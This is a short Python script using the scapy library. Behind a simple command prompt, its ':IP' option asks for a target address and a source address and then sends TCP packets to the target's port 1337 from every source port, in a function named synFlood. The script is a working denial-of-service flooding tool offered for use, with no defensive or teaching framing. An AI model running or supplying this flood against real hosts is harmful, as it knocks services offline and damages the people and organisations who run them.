

import scapy
from scapy.all import *
import sys
import os
from colorama import Fore, Back, Style

os.system("clear")

print(Fore.BLUE +"_______________________________________________________\nPrefix \":\"")
def cmd():
  rando = input("(CMD) > ")
  if rando == ':IP':
    os.system("clear")
    print(Fore.YELLOW +"IF VPN IS ENABLED TYPE VPN IP IN DEVICE IP SECTION.")
    work = input(Fore.GREEN +"Target: \n")
    tork = input(Fore.GREEN +"Current Device IP: \n")
    print(Style.RESET_ALL)

    def synFlood(srs, tgt):
      for sport in range(1024, 65535):
        L3 = IP(src=srs, dst=tgt)
        L4 = TCP(sport=sport, dport=1337)
        pkt = L3/L4
        send(pkt)

    srs = tork
    tgt = work
    synFlood(srs, tgt)
  



  if rando == ':help':
    os.system("clear")
    print('Commands:\n|:help\n|:IP\n|:quit\n|:LOOKUP')
    cmd()

  if rando == ':LOOKUP':
    print("Not yet avaible at this moment. Will be updated soon.")

  

  if rando == ':quit':
    os.system("clear")
    quit()
  else:
    cmd()


  





  
cmd()
